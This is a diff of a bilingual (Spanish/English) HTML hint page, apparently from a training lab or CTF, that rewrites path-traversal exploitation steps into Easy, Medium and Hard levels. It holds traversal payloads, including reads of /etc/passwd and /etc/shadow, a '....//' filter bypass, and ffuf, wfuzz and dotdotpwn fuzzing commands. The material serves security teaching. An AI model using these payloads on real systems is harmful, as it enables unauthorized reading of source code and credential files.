@@ -32,36 +32,28 @@
     <h3>Pasos de explotación</h3>
     <ol>
       <li>El parámetro <code>file</code> se concatena con la ruta base <code>static/files/</code> sin validación.</li>
-      <li>Usando <code>../</code> puedes navegar fuera del directorio permitido:</li>
-    </ol>
-    <pre>/files?file=../../database/schema.sql    # esquema BD
-/files?file=../../app.py                  # código fuente
-/files?file=../../config.ini              # configuración
-/files?file=../../etc/passwd              # usuarios del sistema
-/files?file=../../etc/shadow              # hashes de contraseñas
-/files?file=../../etc/hostname            # nombre del host
-/files?file=../../proc/version            # versión del kernel</pre>
-    <ol start="3">
-      <li>Con Burp Suite: intercepta el GET y modifica el parámetro <code>file</code>.</li>
-      <li>Fuzzea rutas con <strong>ffuf</strong> usando wordlists LFI de SecLists:</li>
-    </ol>
-    <pre># Fuzzing básico de path traversal
-ffuf -u "http://TARGET:5000/files?file=FUZZ" \
-  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
-  -mc 200 -fs 0
+      <li><strong>Easy:</strong> Usa <code>../</code> directamente:
+        <pre>/files?file=../../app.py                  # código fuente
+/files?file=../../database/schema.sql    # esquema BD
+/files?file=../../secret/flag.txt        # flag XXE</pre></li>
+      <li><strong>Medium:</strong> Filtra <code>../</code> con un solo reemplazo. Bypass con doble traversal:
+        <pre># ....// → al eliminar ../ interno queda ../
+/files?file=....//....//app.py
+/files?file=....//....//database/schema.sql
 
-# Wordlist alternativa
-ffuf -u "http://TARGET:5000/files?file=FUZZ" \
+# Backslash (funciona en Windows)
+/files?file=..\..\app.py</pre></li>
+      <li><strong>Hard:</strong> Filtra <code>../</code> y <code>..\</code> recursivamente. Usa herramientas automatizadas:
+        <pre># dotdotpwn prueba múltiples técnicas de encoding
+dotdotpwn -m http -h TARGET_IP -x 5000 -f /etc/passwd \
+  -u "http://TARGET_IP/files?file=TRAVERSAL" -k "root:"
+
+# ffuf con wordlists LFI de SecLists
+ffuf -u "http://TARGET_IP/files?file=FUZZ" \
   -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-  -mc 200 -t 20
-
-# Con wfuzz
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
-  --hc 404 "http://TARGET:5000/files?file=FUZZ"
-
-# Con dotdotpwn
-dotdotpwn -m http -h TARGET -x 5000 -f /etc/passwd \
-  -u "http://TARGET:5000/files?file=TRAVERSAL" -k "root:"</pre>
+  -mc 200 -fs 0</pre></li>
+      <li>Con Burp Suite: intercepta el GET y modifica el parámetro <code>file</code> manualmente.</li>
+    </ol>
     <h3>Herramientas</h3>
     <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
   </div>
@@ -69,36 +61,28 @@ dotdotpwn -m http -h TARGET -x 5000 -f /etc/passwd \
     <h3>Exploitation Steps</h3>
     <ol>
       <li>The <code>file</code> parameter is concatenated with the base path <code>static/files/</code> without validation.</li>
-      <li>Using <code>../</code> you can navigate outside the allowed directory:</li>
-    </ol>
-    <pre>/files?file=../../database/schema.sql    # DB schema
-/files?file=../../app.py                  # source code
-/files?file=../../config.ini              # app config
-/files?file=../../etc/passwd              # system users
-/files?file=../../etc/shadow              # password hashes
-/files?file=../../etc/hostname            # hostname
-/files?file=../../proc/version            # kernel version</pre>
-    <ol start="3">
-      <li>With Burp Suite: intercept the GET request and modify the <code>file</code> parameter.</li>
-      <li>Fuzz paths with <strong>ffuf</strong> using SecLists LFI wordlists:</li>
-    </ol>
-    <pre># Basic LFI fuzzing
-ffuf -u "http://TARGET:5000/files?file=FUZZ" \
-  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
-  -mc 200 -fs 0
+      <li><strong>Easy:</strong> Use <code>../</code> directly:
+        <pre>/files?file=../../app.py                  # source code
+/files?file=../../database/schema.sql    # DB schema
+/files?file=../../secret/flag.txt        # XXE flag</pre></li>
+      <li><strong>Medium:</strong> Filters <code>../</code> with a single-pass replace. Bypass with double traversal:
+        <pre># ....// → removing inner ../ leaves ../
+/files?file=....//....//app.py
+/files?file=....//....//database/schema.sql
 
-# Alternative wordlist
-ffuf -u "http://TARGET:5000/files?file=FUZZ" \
+# Backslash (works on Windows)
+/files?file=..\..\app.py</pre></li>
+      <li><strong>Hard:</strong> Recursively filters <code>../</code> and <code>..\</code>. Use automated tools:
+        <pre># dotdotpwn tests multiple encoding techniques
+dotdotpwn -m http -h TARGET_IP -x 5000 -f /etc/passwd \
+  -u "http://TARGET_IP/files?file=TRAVERSAL" -k "root:"
+
+# ffuf with SecLists LFI wordlists
+ffuf -u "http://TARGET_IP/files?file=FUZZ" \
   -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-  -mc 200 -t 20
-
-# With wfuzz
-wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
-  --hc 404 "http://TARGET:5000/files?file=FUZZ"
-
-# With dotdotpwn
-dotdotpwn -m http -h TARGET -x 5000 -f /etc/passwd \
-  -u "http://TARGET:5000/files?file=TRAVERSAL" -k "root:"</pre>
+  -mc 200 -fs 0</pre></li>
+      <li>With Burp Suite: intercept the GET request and modify the <code>file</code> parameter manually.</li>
+    </ol>
     <h3>Tools</h3>
     <div><span class="tools-badge">curl</span> <span class="tools-badge">ffuf</span> <span class="tools-badge">wfuzz</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">dotdotpwn</span></div>
   </div>
